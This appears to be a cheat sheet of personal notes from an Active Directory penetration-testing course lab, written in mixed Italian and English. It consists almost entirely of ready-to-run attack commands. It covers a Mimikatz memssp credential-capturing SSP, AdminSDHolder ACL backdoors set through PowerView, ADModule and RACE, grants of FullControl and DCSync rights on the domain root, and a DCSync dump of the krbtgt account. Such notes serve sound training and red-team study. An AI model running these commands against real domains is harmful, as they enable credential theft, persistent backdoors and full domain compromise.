*tools*
- [samratashok/ADModule: Microsoft signed ActiveDirectory PowerShell module (github.com)](https://github.com/samratashok/ADModule)
- [samratashok/RACE: RACE is a PowerShell module for executing ACL attacks against Windows targets. (github.com)](https://github.com/samratashok/RACE)
- [PowershellMafia/PowerView (github.com)](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)

### **CUSTOM SSP**
*With MimiKatz*
o uso di mimilib.dll o 
```powershell
Invoke-Mimikatz -Command '"misc::memssp"'
```
### **ACLs – AdminSDHolder**
Modifica le acl per aggiungerti il permesso di full control sull'user
*Add FullControl permissions for a user to the AdminSDHolder using PowerView as DA*
```PowerView
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName student1 -Rights All -Verbose
```
*Using ActiveDirectory Module and Set-ADACL*
```AD_module
Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,D C=local' -Principal student1 -Verbose
```
*Use of race toolkit*
```AD_module
Set-DCPermissions -Method AdminSDHolder -SAMAccountName student1 -Right GenericAll -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' -Verbose
```


### **ACLs – Right Abuse**
*Add FullControl rights*
Usando powershell
```Powershell
Add-ObjectAcl -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' - PrincipalSamAccountName student1 -Rights All -Verbose
```
Using ActiveDirectory Module and Set-ADACL
```AD_module
Set-ADACL -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Principal student1 -Verbose
```
*Add rights for DCSync*
usando powershell
```Powershell
Add-ObjectAcl -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' - PrincipalSamAccountName student1 -Rights DCSync -Verbose
```
Using ActiveDirectory Module and Set-ADACL
```AD_module
Set-ADACL -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Principal student1 -GUIDRight DCSync -Verbose
```
Poi avvia DCSync  con mimikatz
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```